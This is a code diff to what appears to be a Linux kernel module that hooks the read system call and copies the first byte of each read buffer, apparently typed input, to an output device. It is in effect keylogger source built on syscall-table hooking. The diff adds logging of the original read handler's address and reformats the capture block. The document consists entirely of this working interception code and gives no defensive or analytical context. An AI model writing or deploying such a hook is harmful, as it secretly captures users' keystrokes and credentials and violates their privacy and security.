@@ -25,13 +25,13 @@ asmlinkage int readHook(int fd, void* buf, size_t nbytes)
 	{	
 		
 	//printk("\n");
-	printk ("%c\n", (((char *) buf)[0]));
-	
-	{
-		char *bufferAsCharacterAnArray = (char *) buf;
-		char ch = bufferAsCharacterAnArray[0];
-		addCharacterToOutputDevice(ch);
-	}
+	//printk ("%c\n", (((char *) buf)[0]));
+		
+		{
+			char *bufferAsCharacterAnArray = (char *) buf;
+			char ch = bufferAsCharacterAnArray[0];
+			addCharacterToOutputDevice(ch);
+		}
 		//printk("stdin read\n");
 	//printk("bytes read = %d\n", (int) nbytes);
 	}
@@ -40,10 +40,12 @@ asmlinkage int readHook(int fd, void* buf, size_t nbytes)
 
 
 int __init logInput_init(void) {	
-   originalRead = hookSyscall(__NR_read, readHook);
+	originalRead = hookSyscall(__NR_read, readHook);
+	printk(KERN_INFO "original read is at %p\n", originalRead);
 	return 0;
 }
 
 void __exit logInput_exit(void) {
-   hookSyscall(__NR_read, originalRead);
+	printk(KERN_INFO "restoring original read call to %p\n", originalRead);
+	hookSyscall(__NR_read, originalRead);
 }
